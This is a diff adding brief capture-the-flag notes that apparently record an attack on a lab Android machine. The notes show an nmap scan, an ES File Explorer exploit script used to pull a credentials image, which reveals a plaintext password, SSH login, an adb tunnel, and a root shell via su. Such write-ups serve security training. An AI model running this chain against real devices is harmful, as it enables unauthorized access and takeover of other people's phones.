@@ -1,0 +1,32 @@
+nmap -sV -sC -oA inital 10.10.10.247
+
+actually returns nothing special only ssh and adb ports
+
+nmap -p- 10.10.10.247
+return ports
+2222/tcp  open     EtherNetIP-1
+5555/tcp  filtered freeciv
+34211/tcp open     unknown
+42135/tcp open     unknown
+59777/tcp open     
+
+google 59777 port android
+ES file explorer exploit
+python3 exp.py listPics 10.10.10.247
+python3 exp.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
+user: kristi
+password: Kr1sT!5h@Rp3xPl0r3!
+
+ssh kristi@10.10.10.247 -p 2222
+enumerate
+/sdcard/user.txt
+
+proxy from ssh connection
+ssh -L 5555:localhost:5555 kristi@10.10.10.247 -p 2222
+
+adb connect localhost:5555
+adb devices
+adb -s localhost:5555 shell
+su
+whoami
+root
